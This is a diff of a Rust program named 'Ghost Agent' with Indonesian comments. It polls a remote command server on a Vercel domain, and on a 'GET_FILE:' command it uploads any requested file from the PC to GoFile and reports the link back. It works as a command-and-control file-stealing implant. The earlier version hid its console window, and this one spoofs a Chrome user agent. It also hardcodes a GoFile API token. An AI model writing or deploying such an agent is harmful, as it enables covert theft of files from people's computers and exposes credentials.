@@ -1,52 +1,72 @@
-#![windows_subsystem = "windows"] // 👻 Hide Console Window
-
 use std::time::Duration;
-use tokio::time::sleep;
-use reqwest::Client;
-use serde::{Deserialize, Serialize};
-use serde_json::json;
 use std::path::Path;
+use tokio::time::sleep;
 use tokio::fs::File;
 use tokio_util::codec::{BytesCodec, FramedRead};
+use reqwest::Client;
+use serde::Deserialize;
+use serde_json::json;
 
-// CONFIG
-const API_URL: &str = "https://erzysh.vercel.app/api/ghost"; // Ganti domain lo
-const DISCORD_LIMIT: u64 = 24 * 1024 * 1024; // 24MB buffer
+// --- KONFIGURASI ---
+const API_URL: &str = "https://erzysh.vercel.app/api/ghost"; 
+const GOFILE_TOKEN: &str = "eNi42POOnDBiGBWf9LfDOP2Yjoe7DqQy"; 
+
+// --- STRUCT RESPONSE ---
+#[derive(Deserialize, Debug)]
+struct GoFileUploadResponse {
+    status: String,
+    data: Option<UploadData>,
+}
+
+#[derive(Deserialize, Debug)]
+struct UploadData {
+    #[serde(rename = "downloadPage")]
+    download_page: String,
+}
 
 #[derive(Deserialize)]
 struct CommandResponse {
-    messageId: Option<String>,
+    #[serde(rename = "messageId")]
+    message_id: Option<String>,
     command: Option<String>,
 }
 
 #[tokio::main]
 async fn main() {
-    let client = Client::new();
+    println!("👻 Ghost Agent Active (GoFile Singapore Node)...");
+    
+    // User-Agent Chrome
+    let client = Client::builder()
+        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+        .build()
+        .unwrap();
 
     loop {
-        // 1. Poll Command
         match fetch_command(&client).await {
             Ok(Some((msg_id, cmd))) => {
+                println!("📩 Perintah: {}", cmd);
                 if cmd.starts_with("GET_FILE:") {
                     let path = cmd.trim_start_matches("GET_FILE:");
                     handle_file_request(&client, path, &msg_id).await;
                 }
             }
-            _ => {
-                // Sleep dynamic: Kalau error/kosong, sleep lamaan dikit
-                sleep(Duration::from_secs(5)).await;
-            }
+            Err(e) => println!("⚠️ Fetch error: {}", e),
+            _ => {}
         }
-        sleep(Duration::from_secs(2)).await;
+        sleep(Duration::from_secs(3)).await;
     }
 }
 
 async fn fetch_command(client: &Client) -> Result<Option<(String, String)>, Box<dyn std::error::Error>> {
     let resp = client.get(API_URL).send().await?;
     if resp.status().is_success() {
-        let data: CommandResponse = resp.json().await?;
-        if let (Some(mid), Some(cmd)) = (data.messageId, data.command) {
-            return Ok(Some((mid, cmd)));
+        let text = resp.text().await?;
+        if text.trim().is_empty() || text == "null" { return Ok(None); }
+        
+        if let Ok(data) = serde_json::from_str::<CommandResponse>(&text) {
+            if let (Some(mid), Some(cmd)) = (data.message_id, data.command) {
+                return Ok(Some((mid, cmd)));
+            }
         }
     }
     Ok(None)
@@ -55,58 +75,61 @@ async fn fetch_command(client: &Client) -> Result<Option<(String, String)>, Box<
 async fn handle_file_request(client: &Client, path_str: &str, msg_id: &str) {
     let path = Path::new(path_str);
     if !path.exists() {
-        report_result(client, msg_id, "Error: File not found on PC").await;
+        let err = format!("❌ File gak ketemu: {}", path_str);
+        println!("{}", err);
+        report_result(client, msg_id, &err).await;
         return;
     }
 
-    let size = std::fs::metadata(path).map(|m| m.len()).unwrap_or(0);
-    let link_result;
-
-    if size < DISCORD_LIMIT {
-        // Upload to Discord via Vercel Proxy (atau langsung ke Webhook kalau lo mau bypass)
-        // Disini kita upload ke GoFile aja biar uniform kodenya, TAPI...
-        // Kalau mau perfect, logic Discord upload harusnya ada di sini.
-        // Untuk simplifikasi Tutorial ini, kita hajar GoFile semua dulu, 
-        // KECUALI lo mau setup Discord Upload logic yang agak ribet multipart-nya.
-        // Mari kita pakai GoFile (Guest) buat semua file dulu biar simple & reliable.
-        link_result = upload_to_gofile(client, path_str).await;
-    } else {
-        link_result = upload_to_gofile(client, path_str).await;
-    }
-
-    match link_result {
-        Ok(url) => report_result(client, msg_id, &url).await,
-        Err(_) => report_result(client, msg_id, "Error: Upload failed").await,
+    println!("🚀 Uploading ke Singapore Server...");
+    match upload_to_gofile(client, path_str).await {
+        Ok(url) => {
+            println!("✅ Sukses! Link: {}", url);
+            report_result(client, msg_id, &url).await;
+        },
+        Err(e) => {
+            // Print error raw biar ketahuan
+            let err = format!("❌ Upload Gagal: {}", e);
+            println!("{}", err);
+            report_result(client, msg_id, &err).await;
+        }
     }
 }
 
 async fn upload_to_gofile(client: &Client, file_path: &str) -> Result<String, Box<dyn std::error::Error>> {
-    // 1. Get Server
-    let server_res: serde_json::Value = client.get("https://api.gofile.io/getServer")
-        .send().await?.json().await?;
-    let server = server_res["data"]["server"].as_str().unwrap_or("store1");
+    // URL Sesuai Dokumentasi (Regional Singapore)
+    let upload_url = "https://upload-ap-sgp.gofile.io/uploadFile";
     
-    // 2. Stream Upload
     let file = File::open(file_path).await?;
     let stream = FramedRead::new(file, BytesCodec::new());
     let file_body = reqwest::Body::wrap_stream(stream);
-    
-    let part = reqwest::multipart::Part::stream(file_body)
-        .file_name(Path::new(file_path).file_name().unwrap().to_string_lossy().to_string());
+    let filename = Path::new(file_path).file_name().unwrap().to_string_lossy().to_string();
 
-    let form = reqwest::multipart::Form::new().part("file", part);
+    // Form data hanya butuh file, token ditaruh di HEADER sesuai docs baru
+    let form = reqwest::multipart::Form::new()
+        .part("file", reqwest::multipart::Part::stream(file_body).file_name(filename));
 
-    let upload_res: serde_json::Value = client.post(format!("https://{}.gofile.io/uploadFile", server))
+    let upload_resp = client.post(upload_url)
+        .header("Authorization", format!("Bearer {}", GOFILE_TOKEN)) // <--- PENTING
         .multipart(form)
-        .send().await?
-        .json().await?;
+        .send()
+        .await?;
 
-    // 3. Get Link
-    if let Some(link) = upload_res["data"]["downloadPage"].as_str() {
-        Ok(link.to_string())
-    } else {
-        Err("Gofile response invalid".into())
+    let raw_upload_body = upload_resp.text().await?;
+    
+    // Debugging: uncomment kalau mau liat respon asli
+    // println!("Raw Response: {}", raw_upload_body);
+
+    let upload_json: GoFileUploadResponse = serde_json::from_str(&raw_upload_body)
+        .map_err(|e| format!("Parsing Error. Server jawab: {}", raw_upload_body))?;
+
+    if upload_json.status == "ok" {
+        if let Some(data) = upload_json.data {
+            return Ok(data.download_page);
+        }
     }
+
+    Err(format!("Status not ok: {}", raw_upload_body).into())
 }
 
 async fn report_result(client: &Client, reply_to_id: &str, data: &str) {
